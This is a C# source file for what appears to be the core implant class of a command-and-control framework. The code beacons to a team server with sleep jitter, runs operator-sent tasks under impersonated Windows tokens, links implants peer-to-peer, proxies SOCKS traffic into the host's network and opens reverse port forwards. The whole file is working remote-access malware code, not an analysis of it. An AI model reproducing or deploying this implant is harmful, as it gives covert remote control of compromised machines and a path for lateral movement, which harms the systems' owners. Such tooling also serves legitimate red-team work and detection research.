using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Reflection;
using System.Security.Principal;
using System.Threading;
using System.Threading.Tasks;

using Drone.Commands;
using Drone.CommModules;

namespace Drone;

public sealed class Drone
{
    public Config Config { get; } = new();
    
    private Metadata _metadata;
    private CommModule _commModule;
    
    private readonly CancellationTokenSource _token = new();

    private readonly List<DroneCommand> _commands = new();
    private readonly Dictionary<string, CancellationTokenSource> _taskTokens = new();
    
    private readonly List<ReversePortForwardState> _revPortForwardStates = new();
    private readonly Dictionary<string, ConcurrentQueue<byte[]>> _revPortForwardQueues = new();

    private readonly Dictionary<string, TcpClient> _socksClients = new();

    private readonly Dictionary<string, P2PCommModule> _children = new();

    public async Task Run()
    {
        // generate metadata
        _metadata = await Metadata.Generate();

        // load commands classes
        LoadCommands();

        // create comm module
        _commModule = GetCommModule();

        switch (_commModule.Type)
        {
            case CommModule.ModuleType.EGRESS:
                await RunAsEgressDrone();
                break;
            
            case CommModule.ModuleType.P2P:
                await RunAsP2PDrone();
                break;
            
            default:
                throw new ArgumentOutOfRangeException();
        }
    }

    private async Task RunAsEgressDrone()
    {
        if (_commModule is not EgressCommModule commModule)
            return;
        
        commModule.Init(_metadata);
        
        // run
        while (!_token.IsCancellationRequested)
        {
            // get frames
            var inbound = await commModule.CheckIn();
            
            // process them
            await HandleInboundFrames(inbound);

            // sleep
            var interval = Config.Get<int>(Setting.SLEEP_INTERVAL);
            var jitter = Config.Get<int>(Setting.SLEEP_JITTER);

            try
            {
                // this will throw if the token is cancelled
                await Task.Delay(Helpers.CalculateSleepTime(interval, jitter), _token.Token);
            }
            catch (TaskCanceledException)
            {
                // ignore
            }
        }
        
        _token.Dispose();
    }

    private async Task RunAsP2PDrone()
    {
        if (_commModule is not P2PCommModule commModule)
            return;
        
        commModule.Init();
        commModule.FrameReceived += HandleFrame;
        
        // this blocks until connected
        await commModule.Start();
        
        // a peer has connected, send this metadata
        var frame = new C2Frame(_metadata.Id, FrameType.CHECK_IN, Crypto.Encrypt(_metadata));
        await commModule.SendFrame(frame);
        
        // drop into loop
        await commModule.Run();
    }

    private async Task HandleInboundFrames(IEnumerable<C2Frame> frames)
    {
        foreach (var frame in frames)
            await HandleFrame(frame);
    }

    private async Task HandleFrame(C2Frame frame)
    {
        // id is null on LINK frames
        if (!string.IsNullOrWhiteSpace(frame.DroneId))
        {
            // if not for this drone, send to children
            if (!frame.DroneId.Equals(_metadata.Id))
            {
                foreach (var kvp in _children.Where(child => child.Value.Running))
                    await kvp.Value.SendFrame(frame);

                return;
            }
        }

        switch (frame.Type)
        {
            case FrameType.CHECK_IN:
                break;

            case FrameType.TASK:
            {
                var task = Crypto.Decrypt<DroneTask>(frame.Data);
                await HandleTask(task);
                
                break;
            }

            case FrameType.TASK_OUTPUT:
                break;

            case FrameType.EXIT:
                break;

            case FrameType.TASK_CANCEL:
            {
                var taskId = Crypto.Decrypt<string>(frame.Data);
                CancelTask(taskId);
                
                break;
            }

            case FrameType.REV_PORT_FWD:
            {
                var packet = Crypto.Decrypt<ReversePortForwardPacket>(frame.Data);
                HandleReversePortForwardPacket(packet);
                
                break;
            }

            // new incoming link from parent
            case FrameType.LINK:
            {
                var link = Crypto.Decrypt<LinkNotification>(frame.Data);
                await HandleLinkNotification(link);
                
                break;
            }
            
            case FrameType.UNLINK:
                break;

            case FrameType.SOCKS_PROXY:
            {
                var packet = Crypto.Decrypt<Socks4Packet>(frame.Data);
                await HandleSocksPacket(packet);
                
                break;
            }
            
            default:
                throw new ArgumentOutOfRangeException();
        }
    }

    private async Task HandleTask(DroneTask task)
    {
        // get the command
        var command = _commands.FirstOrDefault(c => c.Command == task.Command);

        if (command is null)
        {
            var e = new ArgumentOutOfRangeException(nameof(command));
            await SendTaskError(task.Id, e.Message);
            
            return;
        }
        
        // execute
        if (command.Threaded) ExecuteTaskThreaded(command, task);
        else await ExecuteTask(command, task);
    }

    private async Task ExecuteTask(DroneCommand command, DroneTask task)
    {
        try
        {
            // execute without a token
            await command.Execute(task, CancellationToken.None);
        }
        catch (Exception e)
        {
            await SendTaskError(task.Id, e.Message);
        }
    }

    private void ExecuteTaskThreaded(DroneCommand command, DroneTask task)
    {
        // create a new token
        var tokenSource = new CancellationTokenSource();
        
        // add to dict
        _taskTokens.Add(task.Id, tokenSource);
        
        // get the current identity
        using var identity = ImpersonationToken == IntPtr.Zero
            ? WindowsIdentity.GetCurrent()
            : new WindowsIdentity(ImpersonationToken);
        
        // create impersonation context
        using var context = identity.Impersonate();
        
        var thread = new Thread(async () =>
        {
            // wrap this in a try/catch
            try
            {
                // this blocks inside the thread
                await command.Execute(task, tokenSource.Token);
            }
            catch (TaskCanceledException)
            {
                // send a task complete
                await SendTaskComplete(task.Id);
            }
            catch (Exception e)
            {
                await SendTaskError(task.Id, e.Message);
            }
            finally
            {
                // make sure the token is disposed and removed
                if (_taskTokens.ContainsKey(task.Id))
                {
                    _taskTokens[task.Id].Dispose();
                    _taskTokens.Remove(task.Id);
                }
            }
        });
        
        thread.Start();
    }

    public void CancelTask(string taskId)
    {
        if (!_taskTokens.ContainsKey(taskId))
            return;
        
        // cancel the token
        _taskTokens[taskId].Cancel();
    }
    
    private async Task HandleLinkNotification(LinkNotification link)
    {
        // this is sent from the parent
        // which means this is the child
        link.ChildId = _metadata.Id;

        // send to team server
        await SendC2Frame(new C2Frame(_metadata.Id, FrameType.LINK, Crypto.Encrypt(link)));
    }
    
    public async Task AddChildCommModule(string taskId, P2PCommModule commModule)
    {
        commModule.Init();
        
        commModule.FrameReceived += OnFrameReceivedFromChild;
        commModule.OnException += async () =>
        {
            commModule.Stop();

            var childId = _children.FirstOrDefault(kvp => kvp.Value == commModule).Key;
            
            // send an unlink
            await SendC2Frame(new C2Frame(_metadata.Id, FrameType.UNLINK, Crypto.Encrypt(childId)));
        };

        // blocks until connected
        await commModule.Start();
        
        // send a link frame to the child
        var link = new LinkNotification(taskId, _metadata.Id);
        var frame = new C2Frame(string.Empty, FrameType.LINK, Crypto.Encrypt(link));
        await commModule.SendFrame(frame);

        // add to the dict using the task id
        _children.Add(taskId, commModule);
        _ = commModule.Run();
    }

    private async Task OnFrameReceivedFromChild(C2Frame frame)
    {
        if (frame.Type == FrameType.LINK)
        {
            var link = Crypto.Decrypt<LinkNotification>(frame.Data);
            
            // we are the parent
            if (link.ParentId.Equals(_metadata.Id))
            {
                // update key to the child metadata
                if (_children.TryGetValue(link.TaskId, out var commModule))
                {
                    _children.Remove(link.TaskId);
                    _children.Add(link.ChildId, commModule);
                }
            }
        }
        
        // send it outbound
        await SendC2Frame(frame);
    }

    private async Task HandleSocksPacket(Socks4Packet packet)
    {
        switch (packet.Type)
        {
            case Socks4Packet.PacketType.CONNECT:
            {
                var request = packet.Data.Deserialize<Socks4ConnectRequest>();
                await HandleSocksConnect(request);
                
                break;
            }

            case Socks4Packet.PacketType.DATA:
            {
                await HandleSocksData(packet);
                break;
            }

            case Socks4Packet.PacketType.DISCONNECT:
            {
                DisconnectSocksClient(packet.Id);
                break;
            }
                
            default:
                throw new ArgumentOutOfRangeException();
        }
    }

    private async Task HandleSocksConnect(Socks4ConnectRequest request)
    {
        IPAddress target;

        if (!string.IsNullOrWhiteSpace(request.DestinationDomain))
        {
            var lookup = await Dns.GetHostEntryAsync(request.DestinationDomain);
            target = lookup.AddressList.FirstOrDefault(a => a.AddressFamily == AddressFamily.InterNetwork);
        }
        else
        {
            target = new IPAddress(request.DestinationAddress);
        }

        var client = new TcpClient();
        await client.ConnectAsync(target, request.DestinationPort);

        if (_socksClients.ContainsKey(request.Id))
        {
            _socksClients[request.Id].Dispose();
            _socksClients.Remove(request.Id);
        }
        
        _socksClients.Add(request.Id, client);
        
        // send packet back in acknowledgement
        var packet = new Socks4Packet(request.Id, Socks4Packet.PacketType.CONNECT);
        var frame = new C2Frame(_metadata.Id, FrameType.SOCKS_PROXY, Crypto.Encrypt(packet));
        await SendC2Frame(frame);
    }

    private async Task HandleSocksData(Socks4Packet inbound)
    {
        if (_socksClients.TryGetValue(inbound.Id, out var client))
        {
            try
            {
                // write data
                await client.WriteClient(inbound.Data);
            
                // read response
                // this will block if there's no data?
                var response = await client.ReadClient();
            
                // send back to team server
                var outbound = new Socks4Packet(inbound.Id, Socks4Packet.PacketType.DATA, response);
                var frame = new C2Frame(_metadata.Id, FrameType.SOCKS_PROXY, Crypto.Encrypt(outbound));
                await SendC2Frame(frame);
            }
            catch
            {
                // meh
            }
        }
    }

    private void DisconnectSocksClient(string id)
    {
        if (!_socksClients.TryGetValue(id, out var client))
            return;
        
        client.Dispose();
        _socksClients.Remove(id);
    }

    private void HandleReversePortForwardPacket(ReversePortForwardPacket packet)
    {
        switch (packet.Type)
        {
            case ReversePortForwardPacket.PacketType.START:
            {
                // create new queue
                _revPortForwardQueues.Add(packet.Id, new ConcurrentQueue<byte[]>());
                
                // start the forward
                HandleNewReversePortForward(packet);
                break;
            }

            case ReversePortForwardPacket.PacketType.DATA:
            {
                // queue the data
                if (_revPortForwardQueues.ContainsKey(packet.Id))
                    _revPortForwardQueues[packet.Id].Enqueue(packet.Data);
                
                break;
            }

            case ReversePortForwardPacket.PacketType.STOP:
            {
                var state = _revPortForwardStates.Find(s => s.Id.Equals(packet.Id));
                if (state is null)
                    return;
                
                state.Dispose();

                _revPortForwardStates.Remove(state);
                _revPortForwardQueues.Remove(packet.Id);

                break;
            }
            
            default:
                throw new ArgumentOutOfRangeException();
        }
    }

    private void HandleNewReversePortForward(ReversePortForwardPacket packet)
    {
        var bindPort = BitConverter.ToInt32(packet.Data, 0);
        var listener = new TcpListener(new IPEndPoint(IPAddress.Any, bindPort));
        
        listener.Start(100);

        var state = new ReversePortForwardState(packet.Id, listener);
        listener.BeginAcceptSocket(ClientCallback, state);
        
        if (!_revPortForwardStates.Any(s => s.Id.Equals(packet.Id)))
            _revPortForwardStates.Add(state);
    }

    private void ClientCallback(IAsyncResult ar)
    {
        if (ar.AsyncState is not ReversePortForwardState state)
            return;

        try
        {
            var client = state.Listener.EndAcceptSocket(ar);
            state.ClientSocket = client;
            
            // receive from socket
            client.BeginReceive(
                state.Buffer,
                0,
                ReversePortForwardState.BufferSize,
                SocketFlags.None,
                ReceiveCallback,
                state);
        }
        catch (ObjectDisposedException)
        {
            // ignore
        }
    }

    private async void ReceiveCallback(IAsyncResult ar)
    {
        if (ar.AsyncState is not ReversePortForwardState state)
            return;

        var received = state.ClientSocket.EndReceive(ar);
        if (received == 0) return;
        
        // write received into stream
        state.WriteDataToStream(received);
        
        // need to read more?
        if (received >= ReversePortForwardState.BufferSize)
        {
            state.ClientSocket.BeginReceive(
                state.Buffer,
                0,
                ReversePortForwardState.BufferSize,
                SocketFlags.None,
                ReceiveCallback,
                state);
        }
        else
        {
            // send data to TS
            var packet = new ReversePortForwardPacket
            {
                Id = state.Id,
                Type = ReversePortForwardPacket.PacketType.DATA,
                Data = state.GetStreamData()
            };

            await SendC2Frame(new C2Frame(_metadata.Id, FrameType.REV_PORT_FWD, Crypto.Encrypt(packet)));
            
            // wait for response
            byte[] outbound;
            while (!_revPortForwardQueues[state.Id].TryDequeue(out outbound))
                Thread.Sleep(10);
            
            // send response
            state.ClientSocket.Send(outbound, 0, outbound.Length, SocketFlags.None);
            
            // close client connection
            state.DisconnectClient();
            
            // listen again
            state.Listener.BeginAcceptSocket(ClientCallback, state);
        }
    }

    public async Task SendTaskRunning(string taskId)
    {
        await SendTaskOutput(new TaskOutput(taskId, TaskStatus.RUNNING));
    }

    public async Task SendTaskOutput(string taskId, string output)
    {
        await SendTaskOutput(new TaskOutput(taskId, output));
    }

    public async Task SendTaskComplete(string taskId)
    {
        await SendTaskOutput(new TaskOutput(taskId, TaskStatus.COMPLETE));
    }
    
    public async Task SendTaskError(string taskId, string error)
    {
        var taskOutput = new TaskOutput(taskId, TaskStatus.ABORTED, error);
        await SendTaskOutput(taskOutput);
    }

    public async Task SendTaskOutput(TaskOutput output)
    {
        var frame = new C2Frame(_metadata.Id, FrameType.TASK_OUTPUT, Crypto.Encrypt(output));
        await SendC2Frame(frame);
    }

    private async Task SendC2Frame(C2Frame frame)
    {
        // lol bit silly
        switch (_commModule)
        {
            case EgressCommModule ecm:
                await ecm.SendFrame(frame);
                break;
            
            case P2PCommModule pcm:
                await pcm.SendFrame(frame);
                break;
        }
    }

    private void LoadCommands()
    {
        var self = Assembly.GetExecutingAssembly();

        foreach (var type in self.GetTypes())
        {
            if (!type.IsSubclassOf(typeof(DroneCommand)))
                continue;

            var command = (DroneCommand) Activator.CreateInstance(type);
            command.Init(this);
            
            _commands.Add(command);
        }
    }

    private IntPtr _impersonationToken;
    public IntPtr ImpersonationToken
    {
        get => _impersonationToken;
        set
        {
            // ensure the handle is closed first
            if (_impersonationToken != IntPtr.Zero)
                Interop.Methods.CloseHandle(_impersonationToken);
            
            _impersonationToken = value;
        }
    }

    public async Task Stop()
    {
        // send an exit frame
        await SendC2Frame(new C2Frame(_metadata.Id, FrameType.EXIT));

        // cancel main token
        _token.Cancel();
        
        if (_commModule is P2PCommModule commModule)
            commModule.Stop();
    }

    private static CommModule GetCommModule()
        => new HttpCommModule();
}